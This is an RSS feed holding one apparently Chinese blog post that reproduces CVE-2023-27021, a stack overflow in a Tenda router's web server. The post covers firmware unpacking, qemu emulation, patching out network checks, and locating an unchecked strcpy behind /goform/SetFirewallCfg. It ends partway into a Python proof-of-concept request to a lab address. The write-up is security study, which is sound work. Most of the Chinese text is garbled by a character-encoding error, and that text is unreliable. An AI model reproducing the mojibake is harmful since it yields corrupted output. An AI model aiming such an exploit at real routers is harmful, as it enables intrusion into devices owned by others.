<?xml version="1.0"?>
<rss version="2.0">
    <channel>
        <title> â€¢ Posts by &#34;cve-å¤ç°ç³»åˆ—&#34; tag</title>
        <link>https://yhuanhuan01.github.io</link>
        <description>æ¬¢è¿æ¥åˆ°Huançš„ç¬”è®°ç©ºé—´~~~~~~ğŸŒ¸</description>
        <language>zh-CN</language>
        <pubDate>Fri, 10 May 2024 16:11:47 +0800</pubDate>
        <lastBuildDate>Fri, 10 May 2024 16:11:47 +0800</lastBuildDate>
        <category>æ ˆ</category>
        <category>shellcode</category>
        <category>rw</category>
        <category>CVE-å¤ç°ç³»åˆ—</category>
        <category>å †æ‹“å±•æ”»å‡»</category>
        <category>orw</category>
        <category>å †æ ˆç»“åˆ</category>
        <category>æŠ€å·§</category>
        <category>wp</category>
        <category>é¶æœºæ¸—é€</category>
        <category>vulnHUB</category>
        <category>å †</category>
        <category>canary</category>
        <category>csu</category>
        <category>rop</category>
        <category>gdb</category>
        <category>pie</category>
        <category>æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</category>
        <category>æ ¼å¼åŒ–å­—ç¬¦ä¸²</category>
        <category>gotè¡¨</category>
        <category>æ ˆåŠ«æŒ</category>
        <category>protocol</category>
        <category>srop</category>
        <category>uaf</category>
        <category>unlink</category>
        <category>gotæ”¹å†™</category>
        <category>éšæœºæ•°æ£€æŸ¥</category>
        <item>
            <guid isPermalink="true">https://yhuanhuan01.github.io/2024/05/10/CVE-2023-27021/</guid>
            <title>CVE-2023-27021</title>
            <link>https://yhuanhuan01.github.io/2024/05/10/CVE-2023-27021/</link>
            <category>CVE-å¤ç°ç³»åˆ—</category>
            <pubDate>Fri, 10 May 2024 16:11:47 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;CVE-2023-27021-tenda è·¯ç”±å™¨ - æ ˆæº¢å‡ºæ¼æ´&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;å®˜ç½‘ä¸‹è½½é“¾æ¥ä¸ºï¼š&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudGVuZGEuY29tLmNuL2Rvd25sb2FkL2RldGFpbC0yNjgwLmh0bWw=&#34;&gt;https://www.tenda.com.cn/download/detail-2680.html&lt;/span&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;å»å®˜ç½‘ä¸‹è½½ç›¸åº”çš„äº§å“&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#å»å®˜ç½‘ä¸‹è½½ç›¸åº”çš„äº§å“&#34;&gt;#&lt;/a&gt; å»å®˜ç½‘ä¸‹è½½ç›¸åº”çš„äº§å“&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/CVE-2023-27021/image-20240508183219864.png&#34; alt=&#34;image-20240508183219864&#34;&gt;&lt;/p&gt;
&lt;p&gt;ä¸‹è½½ä¹‹åï¼Œä½¿ç”¨ binwalk è¿›è¡Œè§£åŒ…ã€‚&lt;/p&gt;
&lt;h3 id=&#34;è§£åŒ…&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#è§£åŒ…&#34;&gt;#&lt;/a&gt; è§£åŒ…&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;binwalk -Me filename.bin&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;åˆ†è§£å®Œä¹‹åçš„ &lt;code&gt;squashfs-root&lt;/code&gt;  å³ä¸ºè·¯ç”±å™¨çš„æ–‡ä»¶ç³»ç»Ÿã€‚&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;tenda è·¯ç”±å™¨çš„ web å¯åŠ¨ç¨‹åºé€šå¸¸æ˜¯ bin ç›®å½•ä¸‹çš„ httpd æ–‡ä»¶&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;$ file httpd&lt;br&gt;
httpd: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;å¯ä»¥çœ‹åˆ°ä½ arm æ¶æ„çš„ 32 ä½çš„å¯æ‰§è¡Œç¨‹åº&lt;/p&gt;
&lt;h3 id=&#34;æ‰§è¡Œç¨‹åº&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#æ‰§è¡Œç¨‹åº&#34;&gt;#&lt;/a&gt; æ‰§è¡Œç¨‹åº&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;cp $(which qemu-arm-static) ./&lt;/p&gt;
&lt;p&gt;sudo chroot ./ ./qemu-arm-static ./bin/httpd&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/CVE-2023-27021/image-20240508191156518.png&#34; alt=&#34;image-20240508191156518&#34;&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;å‘ç°ç¨‹åºä¸€ç›´å¡åœ¨è¿™é‡Œï¼Œæ‹–è¿› IDA æœç´¢å­—ç¬¦ä¸²  &lt;code&gt;WeLoveLinux&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;æŸ¥æ‰¾åŸå› &#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#æŸ¥æ‰¾åŸå› &#34;&gt;#&lt;/a&gt; æŸ¥æ‰¾åŸå› &lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/CVE-2023-27021/image-20240508193738684.png&#34; alt=&#34;image-20240508193738684&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/CVE-2023-27021/image-20240508193627887.png&#34; alt=&#34;image-20240508193627887&#34;&gt;&lt;/p&gt;
&lt;p&gt;é€šè¿‡æŸ¥çœ‹ï¼Œåœ¨è¿™é‡Œä¼š check_networkã€‚&lt;/p&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;grep&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-rn&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;check_network&#34;&lt;/span&gt; *&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;grep: bin/netctrl: åŒ¹é…åˆ°äºŒè¿›åˆ¶æ–‡ä»¶&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;grep: bin/multiWAN: åŒ¹é…åˆ°äºŒè¿›åˆ¶æ–‡ä»¶&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;grep: bin/httpd: åŒ¹é…åˆ°äºŒè¿›åˆ¶æ–‡ä»¶&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;grep: bin/phddns: åŒ¹é…åˆ°äºŒè¿›åˆ¶æ–‡ä»¶&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;grep: bin/tendaupload: åŒ¹é…åˆ°äºŒè¿›åˆ¶æ–‡ä»¶&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;grep: bin/logserver: åŒ¹é…åˆ°äºŒè¿›åˆ¶æ–‡ä»¶&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;grep: lib/libcommon.so: åŒ¹é…åˆ°äºŒè¿›åˆ¶æ–‡ä»¶&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;å»å¯»æ‰¾è¯¥å‡½æ•°åœ¨é‚£ä¸ªåº“é‡Œã€‚ &lt;code&gt;libcommon.so&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/CVE-2023-27021/image-20240508194018818.png&#34; alt=&#34;image-20240508194018818&#34;&gt;&lt;/p&gt;
&lt;p&gt;å‡½æ•°ä¸»ä½“&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/CVE-2023-27021/image-20240508194346053.png&#34; alt=&#34;image-20240508194346053&#34;&gt;&lt;/p&gt;
&lt;p&gt;å†æ¬¡å¯»æ‰¾ &lt;code&gt;get_eth_name&lt;/code&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;grep&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-rn&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;get_eth_name&#34;&lt;/span&gt; *&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;grep: bin/netctrl: åŒ¹é…åˆ°äºŒè¿›åˆ¶æ–‡ä»¶&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;grep: bin/dnrd: åŒ¹é…åˆ°äºŒè¿›åˆ¶æ–‡ä»¶&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;grep: bin/multiWAN: åŒ¹é…åˆ°äºŒè¿›åˆ¶æ–‡ä»¶&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;grep: bin/dhcpcd: åŒ¹é…åˆ°äºŒè¿›åˆ¶æ–‡ä»¶&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;grep: bin/httpd: åŒ¹é…åˆ°äºŒè¿›åˆ¶æ–‡ä»¶&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;grep: bin/business_proc: åŒ¹é…åˆ°äºŒè¿›åˆ¶æ–‡ä»¶&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;grep: bin/cfmd: åŒ¹é…åˆ°äºŒè¿›åˆ¶æ–‡ä»¶&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;grep: bin/time_check: åŒ¹é…åˆ°äºŒè¿›åˆ¶æ–‡ä»¶&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;grep: lib/libtpi.so: åŒ¹é…åˆ°äºŒè¿›åˆ¶æ–‡ä»¶&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;grep: lib/libChipApi.so: åŒ¹é…åˆ°äºŒè¿›åˆ¶æ–‡ä»¶&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;grep: lib/libcommon.so: åŒ¹é…åˆ°äºŒè¿›åˆ¶æ–‡ä»¶&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;/img/CVE-2023-27021/image-20240508194612599.png&#34; alt=&#34;image-20240508194612599&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/CVE-2023-27021/image-20240508201108424.png&#34; alt=&#34;image-20240508201108424&#34;&gt;&lt;/p&gt;
&lt;p&gt;ä»è¿™é‡Œæˆ‘ä»¬å°±å¯ä»¥çœ‹åˆ°éœ€è¦ä»€ä¹ˆç±»å‹çš„è™šæ‹Ÿç½‘ç»œæ¥å£äº†ã€‚å¯¹åº”å‰é¢çš„ &lt;code&gt;get_eth_name(0)&lt;/code&gt; ===&amp;gt; æ‰€ä»¥æˆ‘ä»¬éœ€è¦ br0&lt;/p&gt;
&lt;h3 id=&#34;å»ºç«‹è™šæ‹Ÿç½‘ç»œæ¥å£&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#å»ºç«‹è™šæ‹Ÿç½‘ç»œæ¥å£&#34;&gt;#&lt;/a&gt; å»ºç«‹è™šæ‹Ÿç½‘ç»œæ¥å£&lt;/h3&gt;
&lt;p&gt;é€šè¿‡ &lt;code&gt;ifconfig&lt;/code&gt;  æŸ¥çœ‹æœ¬åœ°çš„ç½‘å¡&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/CVE-2023-27021/image-20240508183856764.png&#34; alt=&#34;image-20240508183856764&#34;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤å»ºç«‹è™šæ‹Ÿç½‘æ¡¥å¹¶è¿›è¡Œ UP&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;&lt;code&gt;sudo brctl addbr br0 
è¿™ä¸ªå‘½ä»¤åˆ›å»ºä¸€ä¸ªæ–°çš„è™šæ‹Ÿç½‘æ¡¥ï¼ˆbridgeï¼‰ï¼Œåä¸ºbr0ã€‚brctlæ˜¯ç”¨äºç®¡ç†ç½‘ç»œç½‘æ¡¥çš„å‘½ä»¤è¡Œå·¥å…·ï¼Œaddbré€‰é¡¹ç”¨äºæ·»åŠ ä¸€ä¸ªæ–°çš„ç½‘æ¡¥ã€‚è¿™é‡Œï¼Œæˆ‘ä»¬æ·»åŠ äº†ä¸€ä¸ªåä¸ºbr0çš„ç½‘æ¡¥ã€‚

sudo brctl addif br0 ens33
è¿™ä¸ªå‘½ä»¤å°†ç‰©ç†ç½‘ç»œæ¥å£ens33æ·»åŠ åˆ°åˆšåˆšåˆ›å»ºçš„è™šæ‹Ÿç½‘æ¡¥br0ä¸­ã€‚addifé€‰é¡¹ç”¨äºå°†ç½‘ç»œæ¥å£æ·»åŠ åˆ°ç½‘æ¡¥ã€‚è¿™æ ·ï¼Œæ‰€æœ‰é€šè¿‡ens33æ¥å£çš„ç½‘ç»œæµé‡éƒ½ä¼šè¢«è½¬å‘åˆ°br0ç½‘æ¡¥ï¼Œä»è€Œå®ç°å¤šä¸ªç½‘ç»œæ¥å£ä¹‹é—´çš„é€šä¿¡ã€‚

sudo ifconfig br0 up
è¿™ä¸ªå‘½ä»¤å¯ç”¨ï¼ˆæ¿€æ´»ï¼‰è™šæ‹Ÿç½‘æ¡¥br0ã€‚ifconfigæ˜¯ä¸€ä¸ªç”¨äºé…ç½®ç½‘ç»œæ¥å£çš„å‘½ä»¤è¡Œå·¥å…·ã€‚åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬ä½¿ç”¨upé€‰é¡¹æ¥æ¿€æ´»br0ç½‘æ¡¥ï¼Œä½¿å…¶å¯ä»¥å¼€å§‹å¤„ç†ç½‘ç»œæµé‡ã€‚

sudo dhclient br0
è¿™ä¸ªå‘½ä»¤ä¸ºè™šæ‹Ÿç½‘æ¡¥br0åˆ†é…ä¸€ä¸ªåŠ¨æ€IPåœ°å€ã€‚dhclientæ˜¯ä¸€ä¸ªç”¨äºè¯·æ±‚å’Œé…ç½®åŠ¨æ€ä¸»æœºé…ç½®åè®®ï¼ˆDHCPï¼‰çš„å‘½ä»¤è¡Œå·¥å…·ã€‚åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬ä½¿ç”¨dhclientä¸ºbr0ç½‘æ¡¥è·å–ä¸€ä¸ªåŠ¨æ€IPåœ°å€ï¼Œè¿™æ ·å®ƒå°±å¯ä»¥ä¸å…¶ä»–ç½‘ç»œè®¾å¤‡è¿›è¡Œé€šä¿¡ã€‚

sudo tunctl -t br0 -u &#39;whoami&#39;
è¿™ä¸ªå‘½ä»¤åˆ›å»ºä¸€ä¸ªåä¸ºbr0çš„è™šæ‹Ÿç½‘ç»œæ¥å£ã€‚tunctlæ˜¯ä¸€ä¸ªç”¨äºç®¡ç†è™šæ‹Ÿç½‘ç»œè®¾å¤‡çš„å‘½ä»¤è¡Œå·¥å…·ï¼Œé€šå¸¸ç”¨äºåˆ›å»ºå’Œç®¡ç†TUN/TAPè®¾å¤‡ã€‚åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬ä½¿ç”¨-té€‰é¡¹æ¥æŒ‡å®šè®¾å¤‡åç§°ï¼ˆbr0ï¼‰ï¼Œ-ué€‰é¡¹æ¥æŒ‡å®šæ‹¥æœ‰è¯¥è®¾å¤‡çš„ç”¨æˆ·çš„ç”¨æˆ·åã€‚&#39;whoami&#39;æ˜¯ä¸€ä¸ªshellå‘½ä»¤ï¼Œç”¨äºè¾“å‡ºå½“å‰ç”¨æˆ·çš„ç”¨æˆ·åï¼Œå› æ­¤è¿™é‡Œä¼šåˆ›å»ºä¸€ä¸ªè™šæ‹Ÿç½‘ç»œæ¥å£ï¼Œå…¶æ‰€æœ‰è€…ä¸ºæ‰§è¡Œå‘½ä»¤çš„å½“å‰ç”¨æˆ·ã€‚

sudo ifconfig br0 192.168.65.1/24
è¿™ä¸ªå‘½ä»¤ä¸ºè™šæ‹Ÿç½‘ç»œæ¥å£br0åˆ†é…ä¸€ä¸ªé™æ€IPåœ°å€ã€‚ifconfigæ˜¯ä¸€ä¸ªç”¨äºé…ç½®ç½‘ç»œæ¥å£çš„å‘½ä»¤è¡Œå·¥å…·ã€‚åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬ä½¿ç”¨å®ƒæ¥ä¸ºbr0æ¥å£æŒ‡å®šä¸€ä¸ªIPåœ°å€ï¼ˆ192.168.65.1ï¼‰å’Œä¸€ä¸ªå­ç½‘æ©ç ï¼ˆ/24ï¼‰ã€‚è¿™æ„å‘³ç€ç½‘ç»œæ¥å£å°†ä½¿ç”¨192.168.65.1ä½œä¸ºå…¶IPåœ°å€ï¼Œå­ç½‘æ©ç ä¸º255.255.255.0ã€‚
&amp;gt; sudo ifconfig br0 down &amp;amp;&amp;amp; sudo brctl delbr br0 åœæ­¢ç½‘ç»œæ¥å£å¹¶åˆ é™¤
&amp;gt; sudo netstat -tulnp | grep 192.168.65.1:80 æŸ¥æ‰¾å¯¹åº”çš„æœåŠ¡
&amp;gt; kill -9 PID kill å‘½ä»¤æ¥åœæ­¢å®ƒ
&amp;gt; sudo netplan apply ens33æ— ipä¿®å¤
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/CVE-2023-27021/image-20240508184626432.png&#34; alt=&#34;image-20240508184626432&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;å†æ¬¡å‡ºç°é—®é¢˜&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#å†æ¬¡å‡ºç°é—®é¢˜&#34;&gt;#&lt;/a&gt; å†æ¬¡å‡ºç°é—®é¢˜&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/CVE-2023-27021/image-20240508201807056.png&#34; alt=&#34;image-20240508201807056&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;æŸ¥æ‰¾åŸå› -2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#æŸ¥æ‰¾åŸå› -2&#34;&gt;#&lt;/a&gt; æŸ¥æ‰¾åŸå› &lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/CVE-2023-27021/image-20240508204305586.png&#34; alt=&#34;image-20240508204305586&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/CVE-2023-27021/image-20240508204329574.png&#34; alt=&#34;image-20240508204329574&#34;&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;GPT:
socket(1, 1, 0): è¿™ä¸ªå‡½æ•°éœ€è¦ä¸‰ä¸ªå‚æ•°ï¼š

ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯åŸŸï¼ˆdomainï¼‰ï¼Œå®ƒæŒ‡å®šäº†socketçš„åè®®æ—ã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œ1ä»£è¡¨AF_INETï¼Œå³IPv4çš„å› ç‰¹ç½‘åè®®æ—ã€‚
ç¬¬äºŒä¸ªå‚æ•°æ˜¯ç±»å‹ï¼ˆtypeï¼‰ï¼Œå®ƒæŒ‡å®šäº†socketçš„é€šä¿¡æ–¹å¼ã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œ1ä»£è¡¨SOCK_STREAMï¼Œè¡¨ç¤ºä¸€ä¸ªé¢å‘è¿æ¥çš„ã€å¯é çš„å­—èŠ‚æµsocketï¼Œé€šå¸¸ç”¨äºTCPåè®®ã€‚
ç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯åè®®ï¼ˆprotocolï¼‰ï¼Œå®ƒæŒ‡å®šäº†socketä½¿ç”¨çš„ç‰¹å®šåè®®ã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œ0è¡¨ç¤ºè®©ç³»ç»Ÿé€‰æ‹©é»˜è®¤åè®®ã€‚å¯¹äºSOCK_STREAMç±»å‹çš„socketï¼Œé€šå¸¸ä½¿ç”¨TCPåè®®ã€‚
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æ‰€ä»¥æˆ‘ä»¬æš‚æ—¶æ— æ³•ä¾ç…§ç°åœ¨çš„ç¯å¢ƒå»ä¿®æ”¹ç½‘ç»œçŠ¶å†µã€‚&lt;/p&gt;
&lt;p&gt;ä½†æ˜¯è¿˜æœ‰ä¸€ç§åŠæ³•æˆ‘ä»¬å¯ä»¥ä¿®æ”¹æ‰§è¡Œé€»è¾‘ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/CVE-2023-27021/image-20240508205103089.png&#34; alt=&#34;image-20240508205103089&#34;&gt;&lt;/p&gt;
&lt;p&gt;æ‰€ä»¥æˆ‘ä»¬å»ä¿®æ”¹è¿™ä¸¤å—çš„é€»è¾‘&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/CVE-2023-27021/image-20240508211506399.png&#34; alt=&#34;image-20240508211506399&#34;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;sudo chroot ./ ./qemu-arm-static ./bin/httpd&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/CVE-2023-27021/image-20240508211557449.png&#34; alt=&#34;image-20240508211557449&#34;&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;æ­¤æ—¶å°±å¯ä»¥æ­£å¸¸è®¿é—®äº†&lt;/p&gt;
&lt;p&gt;ä½†æ˜¯å½“æˆ‘ä»¬æ­£å¸¸è®¿é—®æ—¶ï¼Œå‘ç°ç½‘é¡µæ˜¯ 404ï¼Œæ­¤æ—¶æˆ‘ä»¬è®©ä¸‹é¢çš„ webroot_ro çš„é‡Œé¢æ–‡ä»¶åˆ·è¿›å»å³å¯ã€‚&lt;/p&gt;
&lt;h3 id=&#34;æµ‹è¯•æ¼æ´&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#æµ‹è¯•æ¼æ´&#34;&gt;#&lt;/a&gt; æµ‹è¯•æ¼æ´&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/CVE-2023-27021/image-20240508220917436.png&#34; alt=&#34;image-20240508220917436&#34;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;ä½¿ç”¨ IDA é€†å‘ httpd æ–‡ä»¶ï¼Œå¯»æ‰¾å¯ä»¥é€ æˆæ ˆæº¢å‡ºçš„å‡½æ•°ã€‚æŒ–æ˜æ ˆæº¢å‡ºæ¼æ´ï¼Œé€šå¸¸æˆ‘ä»¬è¦ä»ä¸€äº›å±é™©å‡½æ•°å…¥æ‰‹ï¼Œç¬¬ä¸€ç±»å‡½æ•°æ˜¯ scanfï¼Œå¯èƒ½äº§ç”Ÿæ ¼å¼åŒ–å­—ç¬¦ä¸²æº¢å‡ºæ¼æ´ï¼Œç¬¬äºŒç±»æ˜¯ strcpyã€strcatã€sprintf ç­‰å­—ç¬¦ä¸²æ‹·è´å‡½æ•°ã€‚æ ¹æ® tenda çš„å†å² CVE æ¼æ´ï¼Œstrcpy å‡½æ•°äº§ç”Ÿçš„æ¼æ´æ¯”è¾ƒå¤šï¼Œæ‰€ä»¥æˆ‘ä»¬ä» strcpy å…¥æ‰‹ä¸¾ä¾‹ã€‚&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/CVE-2023-27021/image-20240508221310337.png&#34; alt=&#34;image-20240508221310337&#34;&gt;&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬é€šè¿‡è¿™ä¸ªå»å¯»æ‰¾é˜²ç«å¢™çš„æ¼æ´&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/CVE-2023-27021/image-20240508222124288.png&#34; alt=&#34;image-20240508222124288&#34;&gt;&lt;/p&gt;
&lt;p&gt;src ç›´æ¥å»å¤åˆ¶åˆ° dest é‡Œï¼Œåç»­ä¹Ÿæ²¡æœ‰å¯¹ dest çš„é•¿åº¦è¿›è¡Œæ£€æµ‹ã€‚&lt;/p&gt;
&lt;p&gt;è¿˜éœ€è¦æˆ‘ä»¬å»ç¡®å®šè¿™ä¸ªæ˜¯å¦å¯ä»¥è¿›è¡Œä¼ å…¥ï¼Œsub_2BA8C æ˜¯ WebGetvar (goahead çš„å‡½æ•°ï¼Œæš‚æ—¶è¿˜ä¸ä¼šæ¢å¤ç¬¦å·è¡¨)ï¼Œæ‰€ä»¥æˆ‘ä»¬æ˜¯å¯ä»¥é€šè¿‡è¿™ä¸ªå‡½æ•°è¿›è¡Œä¼ å‚çš„ã€‚æ¥ä¸‹æ¥æˆ‘ä»¬è¿›è¡Œæµ‹è¯•ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/CVE-2023-27021/image-20240509095758402.png&#34; alt=&#34;image-20240509095758402&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/CVE-2023-27021/image-20240509095531606.png&#34; alt=&#34;image-20240509095531606&#34;&gt;&lt;/p&gt;
&lt;p&gt;æ•…çŒœæµ‹ä»¥åŠç›®å½•ä¸º goform&lt;/p&gt;
&lt;p&gt;æµ‹è¯• POC å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; requests&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;url &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;http://192.168.65.1/goform/SetFirewallCfg&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;header &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token string&#34;&gt;&#34;Content-Type&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;application/x-www-form-urlencoded; charset=UTF-8&#34;&lt;/span&gt;&lt;span class=&#34;token 